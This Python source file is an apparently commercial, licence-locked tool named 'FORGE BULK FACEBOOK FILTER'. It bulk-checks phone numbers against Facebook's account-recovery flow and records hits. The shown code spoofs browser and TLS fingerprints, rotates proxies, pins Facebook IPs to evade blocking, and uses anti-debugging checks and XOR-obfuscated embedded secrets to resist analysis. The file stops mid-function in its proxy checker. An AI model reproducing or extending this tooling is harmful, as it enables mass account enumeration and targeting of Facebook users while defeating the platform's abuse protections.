
import argparse
import asyncio
import base64
import ctypes
import hashlib
import hmac
import html as html_lib
import json
import os
import platform
import random
import re
import signal
import socket
import ssl
import struct
import subprocess
import sys
import threading
import time
import uuid
import webbrowser
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from datetime import datetime, timezone
from email.utils import parsedate_to_datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from urllib.parse import quote, urljoin

try:
    import requests
    from requests.adapters import HTTPAdapter
    import urllib3
    import urllib3.util.connection
except ImportError:
    print("[*] Installing required packages (requests, urllib3) for Termux...")
    os.system(f'"{sys.executable}" -m pip install requests urllib3')
    import requests
    from requests.adapters import HTTPAdapter
    import urllib3
    import urllib3.util.connection

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if os.name == "nt":
    try:
        kernel32 = ctypes.windll.kernel32
        handle = kernel32.GetStdHandle(-11)
        mode = ctypes.c_ulong()
        kernel32.GetConsoleMode(handle, ctypes.byref(mode))
        kernel32.SetConsoleMode(handle, mode.value | 0x0004)
    except Exception:
        pass

class ANSI:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    GRAY = "\033[90m"
    CLEAR_LINE = "\r\033[2K"

# ==============================================================================
# ADMIN TELEGRAM CONFIG & OBFUSCATED VAULT (TERMUX + DESKTOP)
# ==============================================================================
ADMIN_TG_USERNAME = "alltypetestingbot"

_XK = 0x5A
_OBF_USER = [46, 53, 53, 54, 41, 106, 107, 107, 106]
_OBF_GIST = [
    107, 106, 99, 56, 108, 57, 108, 56, 57, 104, 104, 56, 108, 104, 109, 56,
    107, 107, 111, 59, 60, 111, 63, 56, 105, 108, 99, 104, 105, 57, 60, 59,
]
_OBF_FILE = [
    54, 51, 57, 63, 52, 41, 63, 41, 5, 40, 63, 61, 51, 41, 46, 40, 35, 116,
    48, 41, 53, 52,
]
_OBF_SECRET = [
    28, 21, 8, 29, 31, 5, 18, 23, 27, 25, 5, 12, 11, 5, 106, 107, 107, 106,
    5, 9, 19, 29, 20, 5, 17, 31, 3, 5, 99, 98, 109, 108,
]

def _unbox(arr: List[int]) -> str:
    return "".join(chr(b ^ _XK) for b in arr)

def _is_termux() -> bool:
    return "com.termux" in os.environ.get("PREFIX", "") or Path("/data/data/com.termux").exists()

def _get_session_store() -> Path:
    base = Path.home() / ".config" / ".forgesys"
    try:
        base.mkdir(parents=True, exist_ok=True)
        return base
    except Exception:
        return Path(".")

SAVED_KEY_PATH = _get_session_store() / ".session.dat"
HWID_ANCHOR_PATH = _get_session_store() / ".hw_anchor.dat"

OPEN_FILE_HANDLES: List[object] = []
STOP_EVENT = threading.Event()

def _install_kill_switch() -> None:
    def _terminate(sig, frame) -> None:
        STOP_EVENT.set()
        for fh in OPEN_FILE_HANDLES:
            try:
                fh.flush()
            except Exception:
                pass
        sys.stdout.write(f"\n{ANSI.BOLD}{ANSI.YELLOW}[!] Process terminated.{ANSI.RESET}\n")
        sys.stdout.flush()
        os._exit(130)

    signal.signal(signal.SIGINT, _terminate)
    if hasattr(signal, "SIGBREAK"):
        signal.signal(signal.SIGBREAK, _terminate)

def _anti_debug_and_tamper_check() -> None:
    """
    Termux-Safe Anti-Debug & Tamper Guard:
    - Allows Termux's native `libtermux-exec.so` in LD_PRELOAD (which previously killed the script on Termux!).
    - Still blocks Python debuggers, Frida, Xposed, Substrate, and ptrace attachers.
    """
    if sys.gettrace() is not None:
        os._exit(1)

    for env_var in ("PYTHONINSPECT", "PYDEVD_LOAD_VALUES_ASYNC", "WINGDB_ACTIVE", "FRIDA_GADGET"):
        if os.environ.get(env_var):
            os._exit(1)

    # Check LD_PRELOAD safely without killing Termux's standard libtermux-exec.so
    ld_preload = os.environ.get("LD_PRELOAD", "")
    if ld_preload:
        clean_ld = ld_preload.replace("/data/data/com.termux/files/usr/lib/libtermux-exec.so", "").strip(": ")
        if clean_ld and any(bad in clean_ld.lower() for bad in ("frida", "xposed", "substrate", "hook", "inject")):
            os._exit(1)

    status_file = Path("/proc/self/status")
    if status_file.exists():
        try:
            for line in status_file.read_text(encoding="utf-8", errors="ignore").splitlines():
                if line.startswith("TracerPid:"):
                    pid_val = int(line.split(":", 1)[1].strip())
                    if pid_val != 0:
                        os._exit(1)
                    break
        except Exception:
            pass

    maps_file = Path("/proc/self/maps")
    if maps_file.exists():
        try:
            maps_txt = maps_file.read_text(encoding="utf-8", errors="ignore").lower()
            for marker in ("frida-agent", "gum-js-loop", "xposedbridge"):
                if marker in maps_txt:
                    os._exit(1)
        except Exception:
            pass

    # closure check removed — false-positives under bytecode encryption / exec() wrappers

def _sha256(text: str) -> str:
    return hashlib.sha256(text.strip().encode("utf-8")).hexdigest()

def _hmac_record(key_hash: str, status: str, hwid: str, exp: int) -> str:
    secret = _unbox(_OBF_SECRET).encode("utf-8")
    msg = f"{key_hash}|{status}|{hwid}|{exp}".encode("utf-8")
    return hmac.new(secret, msg, hashlib.sha256).hexdigest()

def _getprop(prop: str) -> str:
    try:
        out = subprocess.check_output(
            ["getprop", prop],
            stderr=subprocess.DEVNULL,
            timeout=1.5,
        ).decode("utf-8", errors="ignore").strip()
        return out
    except Exception:
        return ""

def get_device_code() -> str:
    """Stable device fingerprint across Termux (Android), Linux, and Windows."""
    parts: List[str] = []
    try:
        if os.name == "nt":
            import winreg
            with winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Cryptography",
                0,
                winreg.KEY_READ | winreg.KEY_WOW64_64KEY,
            ) as k:
                val, _ = winreg.QueryValueEx(k, "MachineGuid")
                if val:
                    parts.append(str(val).strip())
        else:
            for p in ("/etc/machine-id", "/var/lib/dbus/machine-id"):
                if Path(p).exists():
                    txt = Path(p).read_text(encoding="utf-8", errors="ignore").strip()
                    if txt:
                        parts.append(txt)
                        break

            if not parts or _is_termux():
                for prop in (
                    "ro.build.fingerprint",
                    "ro.product.board",
                    "ro.board.platform",
                    "ro.product.model",
                    "ro.product.manufacturer",
                    "ro.hardware",
                ):
                    val = _getprop(prop)
                    if val and val.lower() != "unknown":
                        parts.append(val)

                prefix_dir = os.environ.get("PREFIX", "/data/data/com.termux/files/usr")
                try:
                    st = os.stat(prefix_dir)
                    parts.append(f"{os.getuid()}:{st.st_dev}:{st.st_ino}")
                except Exception:
                    pass
    except Exception:
        pass

    if not parts:
        try:
            if HWID_ANCHOR_PATH.exists():
                anchor = HWID_ANCHOR_PATH.read_text(encoding="utf-8", errors="ignore").strip()
            else:
                anchor = ""
            if not anchor:
                anchor = f"{uuid.uuid4().hex}-{platform.machine()}-{platform.system()}"
                HWID_ANCHOR_PATH.write_text(anchor, encoding="utf-8")
            parts.append(anchor)
        except Exception:
            parts.append(f"{uuid.getnode()}-{platform.machine()}")

    parts.extend([platform.machine(), platform.system()])
    h = _sha256("|".join(parts)).upper()[:12]
    return f"FG-{h[0:4]}-{h[4:8]}-{h[8:12]}"

def _network_time() -> Optional[int]:
    for host in ("https://1.1.1.1", "https://8.8.8.8", "https://api.github.com"):
        try:
            r = requests.head(host, timeout=3.5)
            if "Date" in r.headers:
                return int(parsedate_to_datetime(r.headers["Date"]).timestamp())
        except Exception:
            continue
    return int(time.time())

def _load_registry_data() -> dict:
    _anti_debug_and_tamper_check()
    g_user = _unbox(_OBF_USER)
    g_id = _unbox(_OBF_GIST)
    g_file = _unbox(_OBF_FILE)

    api_url = f"https://api.github.com/gists/{g_id}"
    raw_url = f"https://gist.githubusercontent.com/{g_user}/{g_id}/raw/{g_file}"

    ts = int(time.time() * 1000)
    headers = {
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
        "Expires": "0",
        "User-Agent": f"ForgeGuard/{random.randint(10000, 99999)}",
    }

    # 1. Remote GitHub Gist API
    try:
        api_hdr = dict(headers)
        api_hdr["Accept"] = "application/vnd.github+json"
        r = requests.get(f"{api_url}?_={ts}", headers=api_hdr, timeout=7)
        if r.status_code == 200:
            files = r.json().get("files", {})
            f_obj = files.get(g_file) or next(iter(files.values()), None)
            if f_obj and "content" in f_obj:
                data = json.loads(f_obj["content"])
                if isinstance(data, dict):
                    return data
    except Exception:
        pass

    # 2. Remote GitHub Gist Raw URL
    try:
        r = requests.get(f"{raw_url}?_={ts}", headers=headers, timeout=7)
        if r.status_code == 200:
            data = r.json()
            if isinstance(data, dict):
                return data
    except Exception:
        pass

    # 3. Local fallback registry files (for local testing on Termux/PC)
    for local_name in (g_file, "licenses_registry.json", "secure_registry.json", "licenses_db.json"):
        lp = Path(local_name)
        if lp.exists():
            try:
                data = json.loads(lp.read_text(encoding="utf-8"))
                if isinstance(data, dict):
                    return data
            except Exception:
                continue

    return {}

def _format_expiry_label(exp: int, net_now: Optional[int] = None) -> str:
    if exp <= 0:
        return "LIFETIME (NEVER EXPIRES)"
    now_ts = net_now if net_now is not None else int(time.time())
    rem_sec = max(0, exp - now_ts)
    days = rem_sec // 86400
    hours = (rem_sec % 86400) // 3600
    mins = (rem_sec % 3600) // 60
    dt_str = datetime.fromtimestamp(exp, tz=timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
    if days > 0:
        return f"{dt_str} ({days}d {hours}h remaining)"
    return f"{dt_str} ({hours}h {mins}m remaining)"

def _verify_access(raw_key: str, dev_code: str) -> Tuple[bool, str, str]:
    _anti_debug_and_tamper_check()
    clean_key = re.sub(r"[^A-Z0-9\-]", "", raw_key.strip().upper())
    if not clean_key:
        return False, "No access key provided.", ""

    reg = _load_registry_data()
    if not reg or not isinstance(reg, dict):
        return False, "Unable to reach license server.", ""

    dev_upper = dev_code.strip().upper()
    dev_hash = _sha256(dev_upper)
    revoked_list = reg.get("revoked_hwids", [])
    if dev_hash in revoked_list or dev_upper in revoked_list:
        return False, "Device ID has been revoked by Admin.", ""

    licenses = reg.get("licenses", {})
    key_hash = _sha256(clean_key)
    rec = licenses.get(key_hash)
    if not rec or not isinstance(rec, dict):
        return False, "Access key not approved.", ""

    status = str(rec.get("status", ""))
    if status != "active":
        return False, f"License status is {status or 'inactive'}.", ""

    bound = str(rec.get("hwid", "*"))
    if bound and bound != "*" and bound not in (dev_hash, dev_upper):
        return False, "Access key is bound to another Device ID.", ""

    exp = int(rec.get("exp", 0))

    sig = str(rec.get("sig", ""))
    expected_sig = _hmac_record(key_hash, status, bound, exp)
    if sig and not hmac.compare_digest(sig, expected_sig):
        return False, "Access key validation failed.", ""

    net_now = _network_time()
    if exp > 0 and net_now is not None and net_now > exp:
        exp_dt = datetime.fromtimestamp(exp, tz=timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
        return False, f"License expired at {exp_dt}.", ""

    exp_label = _format_expiry_label(exp, net_now)
    return True, "OK", exp_label

def _redirect_to_telegram_admin(dev_code: str) -> None:
    clean_user = ADMIN_TG_USERNAME.lstrip("@").strip()
    if not clean_user:
        return

    prefill_text = quote(f"Hello Admin, please approve my FORGE Device ID: {dev_code}")
    tg_deep_uri = f"tg://resolve?domain={clean_user}&text={prefill_text}"
    tg_https_url = f"https://t.me/{clean_user}?text={prefill_text}"

    sys.stdout.write(
        f"{ANSI.BOLD}{ANSI.MAGENTA}[*] Redirecting to Telegram Admin (@{clean_user})...{ANSI.RESET}\n"
        f"{ANSI.BOLD}{ANSI.CYAN}[*] Direct Link: {ANSI.YELLOW}https://t.me/{clean_user}{ANSI.RESET}\n\n"
    )
    sys.stdout.flush()

    if _is_termux():
        for cmd in (
            ["termux-open-url", tg_https_url],
            ["am", "start", "--user", "0", "-a", "android.intent.action.VIEW", "-d", tg_deep_uri],
            ["am", "start", "--user", "0", "-a", "android.intent.action.VIEW", "-d", tg_https_url],
        ):
            try:
                res = subprocess.run(
                    cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=2.0,
                )
                if res.returncode == 0:
                    return
            except Exception:
                continue
        return

    if os.name == "nt":
        try:
            os.startfile(tg_https_url)  # type: ignore[attr-defined]
            return
        except Exception:
            pass

    for opener in ("xdg-open", "open"):
        try:
            res = subprocess.run(
                [opener, tg_https_url],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=2.0,
            )
            if res.returncode == 0:
                return
        except Exception:
            continue

    try:
        webbrowser.open(tg_https_url)
    except Exception:
        pass

def _save_encrypted_session(raw_key: str, dev_code: str) -> None:
    try:
        mask = hashlib.sha256((dev_code + _unbox(_OBF_SECRET)).encode("utf-8")).digest()
        raw_bytes = raw_key.encode("utf-8")
        enc = bytes(b ^ mask[i % len(mask)] for i, b in enumerate(raw_bytes))
        SAVED_KEY_PATH.write_text(base64.b64encode(enc).decode("ascii"), encoding="utf-8")
    except Exception:
        pass

def _load_encrypted_session(dev_code: str) -> Optional[str]:
    if not SAVED_KEY_PATH.exists():
        return None
    try:
        b64 = SAVED_KEY_PATH.read_text(encoding="utf-8", errors="ignore").strip()
        enc = base64.b64decode(b64)
        mask = hashlib.sha256((dev_code + _unbox(_OBF_SECRET)).encode("utf-8")).digest()
        dec = bytes(b ^ mask[i % len(mask)] for i, b in enumerate(enc))
        return dec.decode("utf-8").strip().upper()
    except Exception:
        return None

def _safe_input(prompt_str: str) -> str:
    try:
        sys.stdout.write(prompt_str)
        sys.stdout.flush()
        line = sys.stdin.readline()
        if not line:
            os._exit(0)
        cleaned = re.sub(r"[\u200b-\u200d\ufeff\r\n]", "", line).strip()
        return cleaned
    except (EOFError, KeyboardInterrupt):
        os._exit(0)

# ==============================================================================
# BANNER & AUTHORIZATION FLOW
# ==============================================================================
def clear_screen() -> None:
    os.system("cls" if os.name == "nt" else "clear")
    sys.stdout.write("\033[2J\033[H")
    sys.stdout.flush()

def print_forge_banner(
    dev_code: Optional[str] = None,
    expiry_label: Optional[str] = None,
) -> None:
    banner = (
        f"\n"
        f"{ANSI.BOLD}{ANSI.CYAN}  ███████╗ ██████╗ ██████╗  ██████╗ ███████╗{ANSI.RESET}\n"
        f"{ANSI.BOLD}{ANSI.CYAN}  ██╔════╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝{ANSI.RESET}\n"
        f"{ANSI.BOLD}{ANSI.MAGENTA}  █████╗  ██║   ██║██████╔╝██║  ███╗█████╗  {ANSI.RESET}\n"
        f"{ANSI.BOLD}{ANSI.MAGENTA}  ██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝  {ANSI.RESET}\n"
        f"{ANSI.BOLD}{ANSI.GREEN}  ██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗{ANSI.RESET}\n"
        f"{ANSI.BOLD}{ANSI.GREEN}  ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝{ANSI.RESET}\n"
        f"{ANSI.BOLD}{ANSI.YELLOW}       >> FORGE BULK FACEBOOK FILTER <<{ANSI.RESET}\n"
    )
    if dev_code and expiry_label:
        banner += (
            f"{ANSI.BOLD}{ANSI.GRAY}  ============================================={ANSI.RESET}\n"
            f"{ANSI.BOLD}{ANSI.CYAN}   Device ID  : {ANSI.YELLOW}{dev_code}{ANSI.RESET}\n"
            f"{ANSI.BOLD}{ANSI.CYAN}   Expired At : {ANSI.GREEN}{expiry_label}{ANSI.RESET}\n"
            f"{ANSI.BOLD}{ANSI.GRAY}  ============================================={ANSI.RESET}\n"
        )
    sys.stdout.write(banner + "\n")
    sys.stdout.flush()

def authorize_session(cli_key: Optional[str] = None) -> Tuple[str, str]:
    _install_kill_switch()
    _anti_debug_and_tamper_check()
    dev_code = get_device_code()

    if cli_key:
        ok, _reason, exp_label = _verify_access(cli_key, dev_code)
        if ok:
            _save_encrypted_session(cli_key.strip().upper(), dev_code)
            clear_screen()
            os.system("cls" if os.name == "nt" else "clear")
            print_forge_banner(dev_code=dev_code, expiry_label=exp_label)
            return dev_code, exp_label

    saved = _load_encrypted_session(dev_code)
    if saved:
        ok, _reason, exp_label = _verify_access(saved, dev_code)
        if ok:
            clear_screen()
            print_forge_banner(dev_code=dev_code, expiry_label=exp_label)
            return dev_code, exp_label
        try:
            SAVED_KEY_PATH.unlink()
        except Exception:
            pass

    print_forge_banner()
    sys.stdout.write(
        f"{ANSI.BOLD}{ANSI.RED}[!] Unapproved Device / No Active License Found.{ANSI.RESET}\n"
        f"{ANSI.BOLD}{ANSI.CYAN}[*] Your Device ID : {ANSI.YELLOW}{dev_code}{ANSI.RESET}\n"
    )
    sys.stdout.flush()

    _redirect_to_telegram_admin(dev_code)

    while True:
        key_in = _safe_input(f"{ANSI.BOLD}{ANSI.YELLOW}[?] Enter Approved Access Key: {ANSI.RESET}").upper()
        ok, reason, exp_label = _verify_access(key_in, dev_code)
        if ok:
            _save_encrypted_session(key_in, dev_code)
            clear_screen()
            print_forge_banner(dev_code=dev_code, expiry_label=exp_label)
            return dev_code, exp_label

        sys.stdout.write(f"{ANSI.BOLD}{ANSI.RED}[!] Access denied: {reason}{ANSI.RESET}\n")
        sys.stdout.flush()

# ==============================================================================
# CORE FACEBOOK RECOVERY ENGINE
# ==============================================================================
print_lock = threading.Lock()
file_lock = threading.Lock()
stats_lock = threading.Lock()

PINNED_FACEBOOK_IP: str = ""
ORIGINAL_CREATE_CONNECTION = urllib3.util.connection.create_connection

META_ANYCAST_IPS = [
    "157.240.22.35",
    "157.240.1.35",
    "157.240.241.35",
    "157.240.192.35",
    "31.13.71.36",
    "163.70.151.35",
]

class State:
    HAVE = "HAVE"
    NOT_HAVE = "NOT_HAVE"
    RATE_LIMIT = "RATE_LIMIT"
    ERROR = "ERROR"

TOTAL_NUMBERS = 0
CHECKED_NUMBERS = 0
FOUND_NUMBERS = 0

@dataclass(frozen=True)
class BrowserProfile:
    name: str
    user_agent: str
    accept: str
    accept_language: str
    ciphers: str

BROWSER_PROFILES: List[BrowserProfile] = [
    BrowserProfile(
        name="OperaMini-75-Android",
        user_agent="Opera/9.80 (Android; Opera Mini/75.0.2254/191.305; U; en) Presto/2.12.423 Version/12.16",
        accept="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        accept_language="en-US,en;q=0.9",
        ciphers="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256",
    ),
    BrowserProfile(
        name="OperaMini-65-iOS",
        user_agent="Opera/9.80 (iPhone; Opera Mini/16.0.14/191.298; U; en) Presto/2.12.423 Version/12.16",
        accept="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        accept_language="en-US,en;q=0.9",
        ciphers="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256",
    ),
    BrowserProfile(
        name="KaiOS-2.5-Nokia",
        user_agent="Mozilla/5.0 (Mobile; Nokia_8110_4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5",
        accept="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        accept_language="en-US,en;q=0.8",
        ciphers="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256",
    ),
    BrowserProfile(
        name="KaiOS-3.0-Alcatel",
        user_agent="Mozilla/5.0 (Mobile; Alcatel_4052R; rv:84.0) Gecko/84.0 Firefox/84.0 KAIOS/3.0",
        accept="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        accept_language="en-US,en;q=0.9",
        ciphers="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256",
    ),
    BrowserProfile(
        name="UCBrowser-Mini-12",
        user_agent="UCWEB/2.0 (MIDP-2.0; U; Adr 9.0; en-US; SM-G532G) U2/1.0.0 UCBrowser/11.5.0.1015 U2/1.0.0 Mobile",
        accept="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        accept_language="en-US,en;q=0.9",
        ciphers="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256",
    ),
    BrowserProfile(
        name="Nokia-Asha-S40",
        user_agent="Mozilla/5.0 (Series40; Nokia302/14.26; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27",
        accept="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        accept_language="en-US,en;q=0.9",
        ciphers="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256",
    ),
    BrowserProfile(
        name="BlackBerry-BB10",
        user_agent="Mozilla/5.0 (BB10; Touch) AppleWebKit/537.35+ (KHTML, like Gecko) Version/10.3.3.2205 Mobile Safari/537.35+",
        accept="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        accept_language="en-US,en;q=0.9",
        ciphers="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256",
    ),
    BrowserProfile(
        name="NetFront-J2ME-WAP",
        user_agent="Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54",
        accept="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        accept_language="en-GB,en-US;q=0.9,en;q=0.8",
        ciphers="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256",
    ),
]

class TLSFingerprintAdapter(HTTPAdapter):
    def __init__(self, ciphers: str, *args, **kwargs) -> None:
        self.ciphers = ciphers
        kwargs.setdefault("pool_connections", 64)
        kwargs.setdefault("pool_maxsize", 64)
        super().__init__(*args, **kwargs)

    def _build_ssl_context(self) -> ssl.SSLContext:
        ctx = ssl.create_default_context()
        try:
            ctx.set_ciphers(self.ciphers)
        except ssl.SSLError:
            pass
        try:
            ctx.set_ecdh_curve("prime256v1")
        except Exception:
            pass
        try:
            ctx.set_alpn_protocols(["http/1.1"])
        except Exception:
            pass
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        return ctx

    def init_poolmanager(self, connections, maxsize, block=False, **pool_kwargs):
        pool_kwargs["ssl_context"] = self._build_ssl_context()
        return super().init_poolmanager(connections, maxsize, block=block, **pool_kwargs)

    def proxy_manager_for(self, proxy, **proxy_kwargs):
        proxy_kwargs["ssl_context"] = self._build_ssl_context()
        return super().proxy_manager_for(proxy, **proxy_kwargs)

def render_status_bar_unlocked() -> None:
    if TOTAL_NUMBERS <= 0 or STOP_EVENT.is_set():
        return
    bar = (
        f"{ANSI.BOLD}{ANSI.MAGENTA}[Checking/Checked/Found] "
        f"[{TOTAL_NUMBERS} / {CHECKED_NUMBERS} / {FOUND_NUMBERS}]{ANSI.RESET}"
    )
    sys.stdout.write(f"{ANSI.CLEAR_LINE}{bar}")
    sys.stdout.flush()

def get_stage_color(stage: str) -> str:
    if stage in ("HIT-HAVE", "PROXY-LIVE"):
        return f"{ANSI.BOLD}{ANSI.GREEN}"
    if stage in ("MISS-NONE", "PROXY-DIE"):
        return ANSI.RED
    if stage in ("BACKOFF", "WARN-GET", "SKIP-FAIL", "FATAL"):
        return ANSI.YELLOW
    if stage in ("DNS-PIN", "DNS-UDP", "TOKEN-OK", "ENGINE-GO", "COMPLETE", "PROXY-DONE", "MODE"):
        return ANSI.CYAN
    if stage in ("CHECK", "GET-TOKEN", "POST-FORM", "HTTP-RESP"):
        return ANSI.BLUE
    return ANSI.GRAY

def log(stage: str, target: str, msg: str = "", have_name: str = "have.txt") -> None:
    if STOP_EVENT.is_set():
        return
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    color = get_stage_color(stage)
    with print_lock:
        sys.stdout.write(ANSI.CLEAR_LINE)
        if stage == "HIT-HAVE":
            sys.stdout.write(
                f"{color}[{ts}] [{stage}] [{target}] [saved {have_name}]{ANSI.RESET}\n"
            )
        else:
            sys.stdout.write(
                f"{color}[{ts}] [{stage}] [{target}]{ANSI.RESET}\n"
            )
        render_status_bar_unlocked()

def build_raw_dns_query(domain: str) -> bytes:
    tid = random.randint(1, 65534)
    header = struct.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0)
    qname = b"".join(len(part).to_bytes(1, "big") + part.encode("ascii") for part in domain.split(".")) + b"\x00"
    return header + qname + struct.pack(">HH", 1, 1)

def parse_raw_dns_response(packet: bytes) -> Optional[str]:
    if len(packet) < 12:
        return None
    ancount = struct.unpack(">H", packet[6:8])[0]
    if ancount == 0:
        return None
    idx = 12
    while idx < len(packet) and packet[idx] != 0:
        idx += 1 + packet[idx]
    idx += 5
    for _ in range(ancount):
        if idx >= len(packet):
            break
        if (packet[idx] & 0xC0) == 0xC0:
            idx += 2
        else:
            while idx < len(packet) and packet[idx] != 0:
                idx += 1 + packet[idx]
            idx += 1
        if idx + 10 > len(packet):
            break
        rtype, _rclass, _ttl, rdlength = struct.unpack(">HHIH", packet[idx:idx + 10])
        idx += 10
        if rtype == 1 and rdlength == 4 and idx + 4 <= len(packet):
            return socket.inet_ntoa(packet[idx:idx + 4])
        idx += rdlength
    return None

def query_udp_dns(domain: str, dns_ip: str, timeout: float = 2.5) -> Optional[str]:
    try:
        pkt = build_raw_dns_query(domain)
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(timeout)
            sock.sendto(pkt, (dns_ip, 53))
            data, _ = sock.recvfrom(512)
            return parse_raw_dns_response(data)
    except Exception:
        return None

def verify_tcp_tls(ip: str, host: str, timeout: float = 3.5) -> Tuple[bool, float, str]:
    t0 = time.perf_counter()
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((ip, 443), timeout=timeout) as raw_sock:
            with ctx.wrap_socket(raw_sock, server_hostname=host) as tls_sock:
                cipher = tls_sock.cipher()
                ms = (time.perf_counter() - t0) * 1000.0
                return True, ms, f"TLS OK ({cipher[0] if cipher else 'ok'})"
    except Exception as exc:
        ms = (time.perf_counter() - t0) * 1000.0
        return False, ms, f"{type(exc).__name__}"

def discover_working_facebook_ip() -> str:
    log("DNS-PIN", "NETWORK")
    candidates: List[str] = []
    for dns_srv in ("8.8.8.8", "1.1.1.1", "9.9.9.9"):
        ip = query_udp_dns("m.facebook.com", dns_srv)
        if ip and ip not in candidates:
            log("DNS-UDP", dns_srv)
            candidates.append(ip)
    try:
        for info in socket.getaddrinfo("m.facebook.com", 443, socket.AF_INET, socket.SOCK_STREAM):
            ip = info[4][0]
            if ip not in candidates:
                candidates.append(ip)
    except Exception:
        pass
    for ip in META_ANYCAST_IPS:
        if ip not in candidates:
            candidates.append(ip)

    for ip in candidates:
        ok, _ms, _detail = verify_tcp_tls(ip, "m.facebook.com", timeout=3.5)
        if ok:
            log("DNS-PIN", ip)
            return ip

    log("FATAL", "NETWORK")
    sys.exit(1)

def patched_create_connection(address: Tuple[str, int], timeout=socket._GLOBAL_DEFAULT_TIMEOUT, source_address=None, socket_options=None):
    host, port = address
    if PINNED_FACEBOOK_IP and (host == "facebook.com" or host.endswith(".facebook.com")):
        address = (PINNED_FACEBOOK_IP, port)
    return ORIGINAL_CREATE_CONNECTION(
        address,
        timeout=timeout,
        source_address=source_address,
        socket_options=socket_options,
    )

urllib3.util.connection.create_connection = patched_create_connection

def normalize_proxy(raw: str) -> str:
    s = raw.strip()
    if "://" in s:
        return s
    if "@" in s:
        return f"http://{s}"
    parts = s.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        ip, port, user, pw = parts
        return f"http://{user}:{pw}@{ip}:{port}"
    return f"http://{s}"

def parse_proxy_host_port(raw: str) -> Tuple[str, str, int, Optional[str]]:
    s = raw.strip()
    scheme = "http"
    if "://" in s:
        scheme, rest = s.split("://", 1)
        scheme = scheme.lower()
    else:
        rest = s

    user_pass = None
    if "@" in rest:
        user_pass, host_port = rest.rsplit("@", 1)
        parts = host_port.split(":")
        host = parts[0].strip()
        port = int(parts[1]) if len(parts) > 1 and parts[1].strip().isdigit() else 0
        norm = f"{scheme}://{user_pass}@{host}:{port}"
    else:
        parts = rest.split(":")
        if len(parts) == 4:
            host, port_s, u, p = parts
            port = int(port_s.strip()) if port_s.strip().isdigit() else 0
            user_pass = f"{u}:{p}"
            norm = f"{scheme}://{user_pass}@{host}:{port}"
        elif len(parts) == 2:
            host = parts[0].strip()
            port = int(parts[1].strip()) if parts[1].strip().isdigit() else 0
            norm = f"{scheme}://{host}:{port}"
        else:
            return "", "", 0, None

    if not host or port <= 0 or port > 65535:
        return "", "", 0, None

    auth_b64 = base64.b64encode(user_pass.encode("utf-8")).decode("ascii") if user_pass else None
    return norm, host, port, auth_b64

async def async_check_single_proxy(raw_proxy: str, sem: asyncio.Semaphore, timeout: float = 2.8) -> Tuple[str, bool, float, str]:
    norm_url, host, port, auth_b64 = parse_proxy_host_port(raw_proxy)
    if not host or port <= 0 or port > 65535 or STOP_EVENT.is_set():
        return raw_proxy, False, 0.0, "InvalidFormat"

    async with sem:
        if STOP_EVENT.is_set():
            return raw_proxy, False, 0.0, "Stopped"
        t0 = time.perf_counter()
        try:
